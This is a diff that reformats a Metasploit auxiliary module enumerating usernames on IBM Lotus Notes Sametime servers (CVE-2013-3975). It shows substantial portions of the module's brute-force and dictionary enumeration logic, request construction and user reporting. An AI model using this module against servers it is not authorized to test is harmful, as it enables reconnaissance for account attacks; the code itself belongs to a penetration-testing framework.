@@ -10,48 +10,55 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'IBM Lotus Notes Sametime User Enumeration',
-      'Description'    => %q{
-        This module extracts usernames using the IBM Lotus Notes Sametime web
-        interface using either a dictionary attack (which is preferred), or a
-        bruteforce attack trying all usernames of MAXDEPTH length or less.
-      },
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'IBM Lotus Notes Sametime User Enumeration',
+        'Description' => %q{
+          This module extracts usernames using the IBM Lotus Notes Sametime web
+          interface using either a dictionary attack (which is preferred), or a
+          bruteforce attack trying all usernames of MAXDEPTH length or less.
+        },
+        'Author' => [
           'kicks4kittens' # Metasploit module
         ],
-      'References' =>
-        [
+        'References' => [
           [ 'CVE', '2013-3975' ],
           [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21671201']
         ],
-      'DefaultOptions' =>
-        {
+        'DefaultOptions' => {
           'SSL' => true
         },
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2013-12-27'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2013-12-27',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('TARGETURI', [ true, 'The path to the userinfo script', '/userinfo/search']),
-         OptEnum.new('CHARSET', [true, 'Charset to use for enumeration', 'alpha', ['alpha', 'alphanum', 'num'] ]),
+        OptEnum.new('CHARSET', [true, 'Charset to use for enumeration', 'alpha', ['alpha', 'alphanum', 'num'] ]),
         OptEnum.new('TYPE', [true, 'Specify UID or EMAIL', 'UID', ['UID', 'EMAIL'] ]),
-        OptPath.new('DICT', [ false,  'Path to dictionary file to use', '']),
-        OptInt.new('MAXDEPTH', [ true,  'Maximum depth to check during bruteforce', 2])
-      ])
+        OptPath.new('DICT', [ false, 'Path to dictionary file to use', '']),
+        OptInt.new('MAXDEPTH', [ true, 'Maximum depth to check during bruteforce', 2])
+      ]
+    )
 
     register_advanced_options(
       [
         OptString.new('SpecialChars', [false, 'Specify special chars (e.g. -_+!@&$/\?)', '' ]),
-        OptString.new('PREFIX', [ false,  'Defines set prefix for each guess (e.g. user)', '']),
-        OptString.new('SUFFIX', [ false,  'Defines set post for each guess (e.g. _adm)', '']),
-        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),
-        OptInt.new('Threads', [ true,  'Number of test threads', 10])
-      ])
+        OptString.new('PREFIX', [ false, 'Defines set prefix for each guess (e.g. user)', '']),
+        OptString.new('SUFFIX', [ false, 'Defines set post for each guess (e.g. _adm)', '']),
+        OptInt.new('TIMING', [ true, 'Set pause between requests', 0]),
+        OptInt.new('Threads', [ true, 'Number of test threads', 10])
+      ]
+    )
   end
 
   def setup
@@ -73,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       if datastore['SpecialChars']
-        datastore['SpecialChars'].chars do | spec |
+        datastore['SpecialChars'].chars do |spec|
           @charset.push(Rex::Text.uri_encode(spec))
         end
       end
@@ -108,13 +115,13 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['TYPE'] == "UID"
       random_val = Rex::Text.rand_text_alpha(32)
     else
-      random_val = Rex::Text.rand_text_alpha(32) +"@"+ Rex::Text.rand_text_alpha(16) + ".com"
+      random_val = Rex::Text.rand_text_alpha(32) + "@" + Rex::Text.rand_text_alpha(16) + ".com"
     end
 
     res = send_request_cgi({
-      'uri'     =>  normalize_uri(target_uri.path),
-      'method'  => 'GET',
-      'ctype'   => 'text/html',
+      'uri' => normalize_uri(target_uri.path),
+      'method' => 'GET',
+      'ctype' => 'text/html',
       'vars_get' => {
         'mode' => datastore['TYPE'].downcase,
         'searchText' => random_val
@@ -187,11 +194,10 @@ class MetasploitModule < Msf::Auxiliary
             end
           end
         end
-      t.each {|x| x.join }
-
+        t.each { |x| x.join }
       rescue ::Timeout::Error
       ensure
-        t.each {|x| x.kill rescue nil }
+        t.each { |x| x.kill rescue nil }
       end
     end
   end
@@ -206,9 +212,9 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     res = send_request_cgi({
-      'uri'     =>  normalize_uri(target_uri.path),
-      'method'  => 'GET',
-      'ctype'   => 'text/html',
+      'uri' => normalize_uri(target_uri.path),
+      'method' => 'GET',
+      'ctype' => 'text/html',
       'vars_get' => {
         'mode' => datastore['TYPE'].downcase,
         'searchText' => tstring
@@ -256,7 +262,7 @@ class MetasploitModule < Msf::Auxiliary
   # To find all users the queue must be extended by adding 'aa' through to 'az'
   def extend_queue(test_current)
     if test_current.length < datastore['MAXDEPTH']
-      @charset.each do | char |
+      @charset.each do |char|
         @test_queue.push(test_current + char)
       end
     elsif @depth_warning and test_current.length == datastore['MAXDEPTH'] and datastore['MAXDEPTH'] > 1
@@ -267,12 +273,12 @@ class MetasploitModule < Msf::Auxiliary
 
   def report_user(username)
     report_note(
-      :host   => rhost,
-      :port   => rport,
-      :proto  => 'tcp',
-      :sname  => 'sametime',
-      :type   => 'ibm_lotus_sametime_user',
-      :data   => { :username => username },
+      :host => rhost,
+      :port => rport,
+      :proto => 'tcp',
+      :sname => 'sametime',
+      :type => 'ibm_lotus_sametime_user',
+      :data => { :username => username },
       :update => :unique_data
     )
   end
@@ -282,18 +288,19 @@ class MetasploitModule < Msf::Auxiliary
 
     user_tbl = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
-      'Header'  => "IBM Lotus Sametime Users",
-      'Prefix'  => "\n",
-      'Indent'  => 1,
-      'Columns'   =>
+      'Header' => "IBM Lotus Sametime Users",
+      'Prefix' => "\n",
+      'Indent' => 1,
+      'Columns' =>
       [
         "UID",
         "Email",
         "CommonName"
-      ])
+      ]
+    )
 
     # populate tables
-    @user_data.each do | line |
+    @user_data.each do |line|
       user_tbl << [ line[0], line[1], line[2] ]
     end
 
